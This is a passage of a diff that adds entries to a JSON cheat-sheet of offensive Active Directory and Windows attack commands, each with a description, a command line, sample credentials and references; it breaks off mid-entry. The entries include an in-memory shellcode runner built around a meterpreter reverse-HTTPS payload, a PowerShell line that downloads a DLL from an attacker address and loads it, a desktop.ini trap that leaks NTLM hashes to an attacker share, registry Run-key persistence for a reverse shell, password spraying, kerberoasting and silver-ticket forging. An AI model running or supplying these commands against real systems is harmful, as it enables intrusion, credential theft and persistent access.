+    "code": "$krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice\n",
+    "items": [
+      "TGT"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Cracking"
+    ],
+    "references": [
+      "https://hashcat.net/hashcat/",
+      "https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a",
+      "https://infosecwriteups.com/hackthebox-forest-5a11553de1"
+    ],
+    "name": "Hashcat-Kerberos"
+  },
+  {
+    "description": "Python script to automatically extract and decrypt Group Policy Preferences (GPP) passwords using streams for carving files instead of mounting shares\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 Get-GPPPassword.py 'TEST.local/john:password123@DC01.TEST.local' -dc-ip 10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username",
+      "Hash"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py",
+      "https://podalirius.net/en/articles/exploiting-windows-group-policy-preferences/"
+    ],
+    "name": "Impacket-Get-GPPPassword"
+  },
+  {
+    "description": "Python command to make an interactive shell of your simple shell. The pty module let\u2019s you spawn a psuedo-terminal that can fool commands like su into thinking they are being executed in a proper terminal.\n\nCommand Reference:\n```\nVariant of shell you will get: /bin/bash or /bin/sh\n```\n",
+    "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n",
+    "code": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\nctrl + z\n\nstty raw -echo; fg \n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence",
+      "General"
+    ],
+    "references": [
+      "https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/"
+    ],
+    "name": "Python-InteractiveShell"
+  },
+  {
+    "description": "Impacket's reg.py is a remote registry manipulation tool, providing similar functionality to reg.exe in Windows.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows -s\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/reg.py",
+      "https://www.hackingarticles.in/impacket-guide-smb-msrpc/"
+    ],
+    "name": "Impacket-Reg"
+  },
+  {
+    "description": "From an attacker's perspective, PingCastle is a powerful Active Directory security tool. It assists in identifying vulnerabilities, misconfigurations, and potential attack vectors within Active Directory environments. With detailed reports, it exposes weaknesses like privilege escalation paths, outdated systems, and permissions vulnerabilities. Utilizing PingCastle, attackers can gain insights to plan targeted attacks, escalate privileges, and exploit weaknesses in compromised Active Directory infrastructures. In this example we use credentials to retrieve information but it can be used to extract extra information.\n\nCommand Reference:\n```\nDomain: arttoolkit.hacker.com\n\n--user: user in the domain\n\n--password: password of the user\n\n--server: IP address of domain controller or domain name\n```\n",
+    "command": "PingCastle.exe --healthcheck --user mmaas --password [pass] --server [ip] \n",
+    "code": "PingCastle.exe --healthcheck --server mydomain.com\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://www.pingcastle.com/documentation/healthcheck/",
+      "https://github.com/vletoux/pingcastle"
+    ],
+    "name": "Pingcastle"
+  },
+  {
+    "description": "Impacket's services.py communicates with Windows services using the MSRPC interface. It can perform many different actions on any service.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n\n\tAction: list\n",
+    "command": "python3 services.py test.local/john:password123@10.10.10.1 list\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "RPC"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/services.py",
+      "https://www.hackingarticles.in/impacket-guide-smb-msrpc/"
+    ],
+    "name": "Impacket-Services"
+  },
+  {
+    "description": "Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). The req command is useful for requesting, retrieving, and renewing certificates. Which is useful for exploiting serveral certifacte templating vulnerabilities like ESC1, ESC2, etc.\n\nCommand Reference:\n```\nUser: e.black\n\nPassword: ypOSJXPqlDOxxbQSfEERy300\n\narbitrary UPN: administrator\n\ndomain: coder.htb\n\nDC: dc01.coder.htb\n\nCA: coder-DC01-CA\n```\n",
+    "command": "certipy req -username e.black@coder.htb -password ypOSJXPqlDOxxbQSfEERy300 -ca coder-DC01-CA -target dc01.coder.htb -template newMaus -upn Administrator@coder.htb -dns dc01.coder.htb\n",
+    "code": "positional arguments:\n{account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template}\n                    Action\naccount             Manage user and machine accounts\nauth                Authenticate using certificates\nca                  Manage CA and certificates\ncert                Manage certificates and private keys\nfind                Enumerate AD CS\nforge               Create Golden Certificates\nptt                 Inject TGT for SSPI authentication\nrelay               NTLM Relay to AD CS HTTP Endpoints\nreq                 Request certificates\nshadow              Abuse Shadow Credentials for account takeover\ntemplate            Manage certificate templates \n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "LDAP",
+      "ADCS"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/ly4k/Certipy"
+    ],
+    "name": "Certipy-req"
+  },
+  {
+    "description": "Impacket's wmiexec.py uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 wmiexec.py test.local/john:password123@10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "WMI"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py",
+      "https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy"
+    ],
+    "name": "Impacket-WMIExec"
+  },
+  {
+    "description": "The desktop.ini files contain the information of the icons you have applied to the folder. We can abuse this to resolve a network path. Once you open the folder you should get the hashes. Make sure you have Responder running on the attacker IP address.\n\nCommand Reference:\n```\nAttacker IP: 10.10.14.4\n```\n",
+    "command": "[.ShellClassInfo]\nIconFile=\\\\10.10.14.4\\maus\n",
+    "code": "mkdir openMe\nattrib +s openMe\ncd openMe\necho [.ShellClassInfo] > desktop.ini\necho IconResource=\\\\192.168.0.1\\aa >> desktop.ini\nattrib +s +h desktop.ini\n",
+    "items": [
+      "Shell",
+      "No_creds"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence",
+      "PrivEsc"
+    ],
+    "references": [
+      "https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini"
+    ],
+    "name": "NTLM-stealing_creds-desktop"
+  },
+  {
+    "description": "ldapmonitor.py allows you to monitor creation, deletion and changes to LDAP objects live during your pentest.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tAttacker IP: 10.10.10.2\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 ldapmonitor.py -u 'john' -d 'TEST.local' -p 'password123' --dc-ip 10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username",
+      "Hash"
+    ],
+    "services": [
+      "LDAP",
+      "Kerberos",
+      "NTLM"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/p0dalirius/LDAPmonitor/tree/master/python"
+    ],
+    "name": "PyLDAPmonitor"
+  },
+  {
+    "description": "The DotNetToJscript project demonstrated how to execute C# assembly from Jscript. Build entire solution and in order to work with DotNetToJscript we need to have the following files on the target machine:\n\nCommand Reference:\n```\nDotNetToJscript.exe\nNDesk.Options.dll\nExampleAssembly.dll: output from C# solution, hold the C# assembly of what the code needs to do.\n\n```\n",
+    "command": ".\\DotNetToJScript.exe .\\ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js\n",
+    "code": "using System;\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\n\n[ComVisible(true)]\npublic class TestClass\n{\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\n    public TestClass()\n    {\n        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.56.128 LPORT=443 -f csharp\n        byte[] buf = new byte[722] {0xfc,0x48,0x83, ... 0x56,0xff,0xd5};\n\n\n        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);\n        Marshal.Copy(buf, 0, addr, buf.Length);\n        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n        WaitForSingleObject(hThread, 0xFFFFFFFF);\n   }\n\n    public void RunProcess(string path)\n    {\n        Process.Start(path);\n    }\n} \n",
+    "items": [
+      "Shell"
+    ],
+    "services": null,
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Injection"
+    ],
+    "references": [
+      "https://github.com/tyranid/DotNetToJScript",
+      "https://www.ired.team/offensive-security/defense-evasion/executing-csharp-assemblies-from-jscript-and-wscript-with-dotnettojscript"
+    ],
+    "name": "DotNetToJscript"
+  },
+  {
+    "description": "Use the DownloadData method of the Net.WebClient class to download the DLL as a byte array, and then use the Load function to load the Byte array into memory instead of disk. After the assembly is loaded, we can interact with it using reflection through the GetType and GetMethod methods, and finally call it through the Invoke method.\n\nCommand Reference:\n```\nDLL: ClassLibrary1.dll\n\nByte array with code: $data\n```\n",
+    "command": "$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')\n",
+    "code": "$assem = [System.Reflection.Assembly]::Load($data)\nor (for local file)   \n$assem = [System.Reflection.Assembly]::LoadFile(\"C:\\user\\documents\\ClassLibrary1.dll\") \n$class = $assem.GetType(\"ClassLibrary1.Class1\") \n$method = $class.GetMethod(\"runner\") \n$method.Invoke(0, $null)\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      null
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "PrivEsc",
+      "Persistence",
+      "Injection"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-7.0"
+    ],
+    "name": "DownloadData"
+  },
+  {
+    "description": "Rubeus' `kerberoast` module will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account's password, which can then be bruteforced offline. The following command is run on a Windows machine in the victim domain.\n\nCommand Reference:\n\n\tOutput File: hashes.txt\n",
+    "command": "Rubeus.exe kerberoast /outfile:hashes.txt\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "PrivEsc"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Rubeus",
+      "https://github.com/GhostPack/Rubeus#kerberoast"
+    ],
+    "name": "Rubeus-Kerberoast"
+  },
+  {
+    "description": "Remote-Method-Guesser (RMG) is a Java RMI vulnerability scanner that is capable of identifying common RMI vulnerabilities automatically. \n\nCommand Reference:\n```\nIP address: arttoolkit.hacker.com\n\nPort: 1099\n\nFunction: enum\n\n```\n",
+    "command": "java -jar rmg-4.4.1-jar-with-dependencies.jar enum 10.0.0.1 1099 \n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "RMI"
+    ],
+    "OS": [
+      "Windows",
+      "Linux",
+      "Mac"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/qtc-de/remote-method-guesser"
+    ],
+    "name": "RMG-RMI"
+  },
+  {
+    "description": "Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will create a windows task with a random name, trigger the task, and then delete it. The following command executes `whoami` on the remote Windows host, authenticating with the hash of user `john`.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tHash: aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76\n\n\tCommand Executed: whoami\n",
+    "command": "python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami\n",
+    "items": [
+      "Hash",
+      "Username"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py",
+      "https://u0041.co/blog/post/1"
+    ],
+    "name": "Impacket-atexec-Hash"
+  },
+  {
+    "description": "targetedKerberoast is a Python script that can, like many others (e.g. GetUserSPNs.py), print \"kerberoast\" hashes for user accounts that have a SPN set. This tool brings the following additional feature: for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), print the \"kerberoast\" hash, and delete the temporary SPN set for that operation.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tAttacker IP: 10.10.10.2\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 targetedKerberoast.py -d test.local -u john -p password123 --dc-ip 10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "Kerberos",
+      "NTLM"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/ShutdownRepo/targetedKerberoast"
+    ],
+    "name": "targetedKerberoast"
+  },
+  {
+    "description": "SharpLDAPmonitor.exe allows you to monitor creation, deletion and changes to LDAP objects live during your pentest.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tAttacker IP: 10.10.10.2\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "SharpLDAPmonitor.exe /dcip:10.10.10.1 /user:TEST.local\\john /pass:password123\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "LDAP",
+      "Kerberos",
+      "NTLM"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/p0dalirius/LDAPmonitor/tree/master/csharp"
+    ],
+    "name": "SharpLDAPmonitor"
+  },
+  {
+    "description": "The Start-Process cmdlet in PowerShell is used to launch a new process (executable file) or open a document using the associated application. It provides a way to interact with the Windows operating system to initiate and control processes from within a PowerShell script or session. Which can be usefull to launch/execute processes as a domain user on a non domain PC.\n\nCommand Reference:\n```\nUsername: mmaas\n\nDomain: domain.local\n\nCommand: powershell_ise.exe\n\n-Credential: If you need to run the process with different credentials, you can provide a PSCredential object using this parameter. You can create a PSCredential object with the Get-Credential cmdlet.\n```\n",
+    "command": "Start-Process 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe' -Credential 'domain.local\\mmaas'\n",
+    "items": [
+      "Shell",
+      "Username",
+      "Password"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence"
+    ],
+    "references": [
+      "https://counihan.co.za/blog/Using-RunAs-from-PowerShell/"
+    ],
+    "name": "Start-proces"
+  },
+  {
+    "description": "Enum4Linux is a tool for enumerating information from Windows and Samba systems, using a number of different techniques. The following command will attempt to enumerate information using no credentials.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n",
+    "command": "enum4linux -a 10.10.10.1\n",
+    "items": [
+      "No_Creds"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/CiscoCXSecurity/enum4linux"
+    ],
+    "name": "Enum4Linux-NoCreds"
+  },
+  {
+    "description": "winpeas.exe is a script that will search for all possible paths to escalate privileges on Windows hosts. The below command will run all priv esc checks and store the output in a file.\n\nCommand Reference:\n\n\tRun all checks: cmd\n\n\tOutput File: output.txt\n",
+    "command": "winpeas.exe cmd > output.txt\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "PrivEsc"
+    ],
+    "references": [
+      "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS",
+      "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/README.md",
+      "https://book.hacktricks.xyz/windows/windows-local-privilege-escalation"
+    ],
+    "name": "winPEAS"
+  },
+  {
+    "description": "Impacket's smbexec.py. This will give you an interactive shell on the Windows host.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 smbexec.py test.local/john:password123@10.10.10.1\n",
+    "items": [
+      "Password",
+      "Username"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py",
+      "https://www.varonis.com/blog/insider-danger-stealthy-password-hacking-with-smbexec/"
+    ],
+    "name": "Impacket-SMBExec"
+  },
+  {
+    "description": "Impacket's ticketer.py can perform Silver Ticket attacks, which crafts a valid TGS ticket for a specific service using a valid user's NTLM hash. It is then possible to gain access to that service. The following command crafts a TGS for the SMB service, which can then be used to gain a shell.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tHash: b18b4b218eccad1c223306ea1916885f\n\n\tDomain SID: S-1-5-21-1339291983-1349129144-367733775\n\n\tSMB Service: cifs\n",
+    "command": "python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john\n",
+    "items": [
+      "Username",
+      "Hash"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py",
+      "https://www.tarlogic.com/en/blog/how-to-attack-kerberos/"
+    ],
+    "name": "Impacket-SilverTicket"
+  },
+  {
+    "description": "Iconv is a command-line program used to convert text from one character encoding to another. It can be used to convert text files from one encoding to another, or to perform character set conversions when moving text between different operating systems or applications. It is useful for copying files from Linux to Windows as it can encode powershell files and execute it on the Windows machine.\n\nCommand Reference:\n\n    Copy file from Linux to Windows\n\n    File to copy: powershell.ps1\n    \n    encoding: UTF-16LE\n\n    Windows command: powershell <base64> -enc\n",
+    "command": "cat powershel.ps1 |iconv -t UTF-16LE |base64 -w 0\n",
+    "items": [
+      "Shell"
+    ],
+    "services": null,
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "General"
+    ],
+    "references": [
+      "https://www.gnu.org/savannah-checkouts/gnu/libiconv/documentation/libiconv-1.17/iconv.1.html#SEC7"
+    ],
+    "name": "Iconv-copyfile"
+  },
+  {
+    "description": "Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). The find command is useful for enumerating AD CS certificate templates, certificate authorities and other configurations.\n\nCommand Reference:\n```\nUser: e.black\n\nPassword: ypOSJXPqlDOxxbQSfEERy300\n\nIP address: 10.129.239.91\n```\n",
+    "command": "certipy find -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -dc-ip 10.129.239.91\n",
+    "code": "Check following properties in templates, makes them vulnerable for ESC1.\n\nClient Authentication               : True\nEnrollment Agent                    : True\nAny Purpose                         : True\nEnrollee Supplies Subject           : True\nCertificate Name Flag               : EnrolleeSuppliesSubject\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "ADCS",
+      "LDAP"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/ly4k/Certipy"
+    ],
+    "name": "Certipy-find"
+  },
+  {
+    "description": "Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host. Winrm Supports PKINIT, meaning if you have a computers PFX file, you can authenticate and get a shell. Note that the command requires a public and a private key in PEM format, that can be extracted by converting the PFX to PEM format. Take a look at the references for more info on that. Password protected PFX files can be cracked with JohnTheRipper.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tPFX File: cert.pfx\n\n\tDomain: EVILCORP\n",
+    "command": "evil-winrm -i 10.10.10.1 -c pub.pem -k priv.pem -S -r EVILCORP\n",
+    "code": "openssl pkcs12 -in certificate.pfx -out certificate.pem -clcerts\n",
+    "items": [
+      "PFX"
+    ],
+    "services": [
+      "WMI"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "references": [
+      "https://github.com/Hackplayers/evil-winrm",
+      "https://book.hacktricks.xyz/cryptography/certificates"
+    ],
+    "name": "Evil-Winrm-PKINIT"
+  },
+  {
+    "description": "Impacket's addcomputer.py will add a computer account to the domain and set its password. The following command will create a new computer over the SMB by specifying the `SAMR` method.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tNew Computer Password: TestPassword123\n\n\tNew Computer Name: testComputer\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "python3 addcomputer.py -method SAMR -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "Persistence"
+    ],
+    "references": [
+      "https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py",
+      "http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html"
+    ],
+    "name": "Impacket-addcomputer-SMB"
+  },
+  {
+    "description": "It is possible to gain persistence on a windows machine by adding reg keys that will execute an arbitrary payload during logon or startup. Keys added to the HKLM hive will execute on startup. Keys added to the HKCU hive will execute when the corresponding user logs on. Adding keys into the HKLM hive will require an elevated shell. There are four keys that can be used: Run, RunOnce, RunServices, and RunServicesOnce. By default, a RunOnce key is deleted after the specified command is executed. The path for these keys is the same for the HKLM and HKCU hives.\n\nCommand Reference:\n\n\tValue Name: Persistence\n\n\tRegKey data type: REG_SZ\n\n\tData: \"C:\\Path\\To\\revshell.exe\"\n\n\tKeyName: \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n",
+    "command": "reg.exe add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Persistence /t REG_SZ /d \"C:\\Path\\To\\revshell.exe\"\n\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Persistence /t REG_SZ /d \"C:\\Path\\To\\revshell.exe\"\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Persistence"
+    ],
+    "references": [
+      "https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/",
+      "https://www.hackingarticles.in/windows-persistence-using-winlogon/",
+      "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg",
+      "https://docs.microsoft.com/en-us/windows-hardware/drivers/install/runonce-registry-key"
+    ],
+    "name": "Regexe-Persistence"
+  },
+  {
+    "description": "PSCredential is a PowerShell cmdlet used to create a credential object. It is used to securely store and retrieve usernames and passwords in scripts or commands. The PSCredential cmdlet requires a username and a SecureString object for the password. \n\nCommand Reference:\n\n\tVariable name: $Cred\n\n  Username: htb.local\\mmaas\n\n\tPassword: $pass = ConvertTo-SecureString 'password123' -AsPlainText -Force\n",
+    "command": "$Cred = New-Object System.Management.Automation.PSCredential('htb.local\\mmaas', $pass)\n",
+    "items": [
+      "Shell"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "General"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.3",
+      "https://pscustomobject.github.io/powershell/howto/PowerShell-Create-Credential-Object/"
+    ],
+    "name": "PSCredential"
+  },
+  {
+    "description": "Rubeus' `asreproast` module will attempt to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will be encrypted with the user's password, which can then be cracked offline. The following command is run on a Windows machine in the victim domain.\n\nCommand Reference:\n\n\tOutput File: hashes.txt\n",
+    "command": "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt\n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Exploitation",
+      "PrivEsc"
+    ],
+    "references": [
+      "https://github.com/GhostPack/Rubeus",
+      "https://github.com/GhostPack/Rubeus#asreproast"
+    ],
+    "name": "Rubeus-ASREPRoast"
+  },
+  {
+    "description": "Nmap's `krb5-enum-users` script attempts to bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to enumerate valid usernames given a list of usernames to try.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername List: usernames.txt\n",
+    "command": "nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='test.local',userdb=usernames.txt 10.10.10.1\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "Kerberos",
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://nmap.org/download.html",
+      "https://nmap.org/nsedoc/scripts/krb5-enum-users.html"
+    ],
+    "name": "Nmap-Krb5-Enum-Users"
+  },
+  {
+    "description": "ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will perform a password spray account against a list of provided users given a password.\n\nCommand Reference:\n\n\tDomain: test.local\n\n\tUsername List: domain_users.txt\n\n\tPassword: password123\n",
+    "command": "kerbrute passwordspray -d test.local domain_users.txt password123\n",
+    "items": [
+      "Username"
+    ],
+    "services": [
+      "Kerberos"
+    ],
+    "OS": [
+      "Linux",
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": [
+      "https://github.com/ropnop/kerbrute"
+    ],
+    "name": "Kerbrute-PasswordSpray"
+  },
+  {
+    "description": "Description what the command does and is usefull for.\n\nCommand Reference:\n```\nList of users: userlist.txt\n\nPassword: denjanjade122566\n\nServer/IP: qreader.htb\n\nService: ssh\n```\n",
+    "command": "hydra -L userlist.txt -p denjanjade122566 qreader.htb ssh \n",
+    "items": [
+      "Username",
+      "Password",
+      "No_creds"
+    ],
+    "services": [
+      "SSH",
+      "SMB",
+      "WMI"
+    ],
+    "OS": [
+      "Windows",
+      "Linux"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "Exploitation",
+      "Cracking"
+    ],
+    "references": [
+      "https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/",
+      "https://www.kali.org/tools/hydra/"
+    ],
+    "name": "Hydra-password_username"
+  },
+  {
+    "description": "Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target server using valid credentials.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "smbclient -L \\\\test.local -I 10.10.10.1 -U john password123\n",
+    "items": [
